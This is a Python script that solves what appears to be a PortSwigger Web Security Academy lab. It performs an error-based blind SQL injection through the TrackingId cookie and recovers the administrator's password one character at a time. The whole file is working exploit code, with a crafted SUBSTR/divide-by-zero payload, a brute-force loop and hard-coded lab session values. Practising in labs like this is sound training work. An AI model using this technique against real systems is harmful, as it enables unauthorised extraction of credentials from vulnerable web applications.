#!/usr/bin/python3

import string
import requests

def perform_blind_sqli_attack():

    # Characters that can be in the password
    characters = string.ascii_lowercase + string.digits
    
    # # Indicator that the request is correct
    # trigger = 'Welcome back!'
    
    # Change the next variables for correct values (host and cookies)
    host = '0adb0069040be67881218e8a002300a6.web-security-academy.net'
    tracking_id = 'zclQ56mJtA9UcRHY'
    session = '2NovGLvdqfw32560LB7wMCcCsFQ3v50Q'
    

    # Variable to send in the request
    url = f'https://{host}/filter'
    params = {'category': 'Accessories'}
    headers = { 
        'Host': host
    }
    
    print('[!] Start Request...')

    password = ''
    finish = False

    for i in range(1,21):
        
        for c in characters:

            sqli = f"' || ( SELECT 1/0 FROM users WHERE username = 'administrator' AND SUBSTR(password,{i},1) = '{c}' ) || '"
            headers['Cookie'] = f"TrackingId={tracking_id}{sqli}; session={session}"
            response = requests.get(url, params = params, headers=headers)
            
            print(f"posisión {i}, caracter {c}")
        
            if response.status_code == 500:
                password += c
                break


        

    ascii_art = """"
            .--.
        |__| .--------.
        |=.| |.------.|
        |--| || SQLi ||
        |  | |'------'|
        |__|~')______('
    """
    
    print(ascii_art)
    print(f'[!] Password: {password}')

if __name__ == '__main__':
    perform_blind_sqli_attack()
